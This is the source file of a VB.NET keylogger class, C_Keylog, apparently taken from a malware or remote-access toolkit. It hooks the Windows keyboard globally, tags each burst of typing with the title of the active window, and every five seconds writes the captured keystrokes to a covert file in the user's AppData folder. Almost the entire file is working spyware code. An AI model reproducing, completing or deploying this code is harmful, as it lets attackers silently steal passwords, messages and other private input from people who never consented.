Namespace Lime

    Public Class C_Keylog
        Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Integer) As Integer
        Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As KeyboardHookDelegate, ByVal hmod As Integer, ByVal dwThreadId As Integer) As IntPtr
        Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As IntPtr, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As KBDLLHOOKSTRUCT) As Integer
        Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
        Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32

        Private Delegate Function KeyboardHookDelegate(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

        Private Const WM_KEYUP As Integer = &H101
        Private Const WM_KEYDOWN As Short = &H100S
        Private Const WM_SYSKEYDOWN As Integer = &H104
        Private Const WM_SYSKEYUP As Integer = &H105

        Public Structure KBDLLHOOKSTRUCT
            Public vkCode As Integer 'KeyCode (Of interest to us)
            Public scanCode As Integer 'ScanCode
            Public flags As Integer
            Public time As Integer
            Public dwExtraInfo As Integer
        End Structure

        Enum virtualKey
            K_Return = &HD
            K_Backspace = &H8
            K_Space = &H20
            K_Tab = &H9
            K_Esc = &H1B
            '...
        End Enum

        Private KeyboardHandle As IntPtr = 0
        Private LastCheckedForegroundTitle As String = ""
        Private callback As KeyboardHookDelegate = Nothing
        Private KeyLog As String

        Public Sub HookKeyboard()
            callback = New KeyboardHookDelegate(AddressOf KeyboardCallback)
            KeyboardHandle = SetWindowsHookEx(13, callback, Diagnostics.Process.GetCurrentProcess.MainModule.BaseAddress, 0)
        End Sub

        Private Function Hooked()
            Return KeyboardHandle <> 0
        End Function

        Public Function KeyboardCallback(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
            Dim keyboard As Object = New Devices.Keyboard
            'Get current foreground window title
            Dim CurrentTitle = GetActiveWindowTitle()

            'If title of the foreground window changed
            If CurrentTitle <> LastCheckedForegroundTitle Then
                LastCheckedForegroundTitle = CurrentTitle
                'Add a little header containing the application title and date
                KeyLog &= vbCrLf & vbCrLf & "----------- " & CurrentTitle & " (" & Now.TimeOfDay.ToString & ") ------------" & vbCrLf
            End If

            'Variable to hold the text describing the key pressed
            Dim Key As String = ""

            'If event is KEYUP
            If wParam = WM_KEYUP Or wParam = WM_SYSKEYUP Then

                If (lParam.vkCode >= &H30 And lParam.vkCode <= &H5A) Or lParam.vkCode = &H20 Then
                    If keyboard.CapsLock = True AndAlso keyboard.ShiftKeyDown Then
                        Key = Convert.ToChar(lParam.vkCode).ToString.ToLower
                    ElseIf keyboard.CapsLock = True AndAlso Not keyboard.ShiftKeyDown Then
                        Key = Convert.ToChar(lParam.vkCode).ToString.ToUpper
                    ElseIf keyboard.CapsLock = False AndAlso Not keyboard.ShiftKeyDown Then
                        Key = Convert.ToChar(lParam.vkCode).ToString.ToLower
                    ElseIf keyboard.CapsLock = False AndAlso keyboard.ShiftKeyDown Then
                        Key = Convert.ToChar(lParam.vkCode).ToString.ToUpper
                    End If
                Else
                    Key = "[" & DirectCast(lParam.vkCode, Windows.Forms.Keys).ToString & "]"
                End If
            End If

            'Add it to the log
            KeyLog &= Key

            Return 0
        End Function

        Private Function GetActiveWindowTitle() As String
            Dim MyStr As String
            MyStr = New String(Chr(0), 100)
            GetWindowText(GetForegroundWindow, MyStr, 100)
            MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)

            Return MyStr
        End Function

        Public Sub Start()

            'Hook keyboard
            HookKeyboard()

            Dim T As New Threading.Thread(AddressOf SaveKbState)
            T.Start()

        End Sub

        Public Shared filepath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & My.Computer.Name & "_" & CStr(Date.Today.Year) & "_" & CStr(Date.Today.Month) & "_" & CStr(Date.Today.Day)

        Public Sub SaveKbState()

            While True
                'Append current keylog data
                Try
                    Dim info As IO.FileInfo = New IO.FileInfo(filepath)
                    If info.Length >= 50000 Then
                        info.Delete()
                    End If
                Catch
                End Try

                Try
                    My.Computer.FileSystem.WriteAllText(filepath, KeyLog, True)
                Catch
                End Try

                'Reset 
                KeyLog = ""
                Threading.Thread.Sleep(5000)
            End While
        End Sub
    End Class

End Namespace


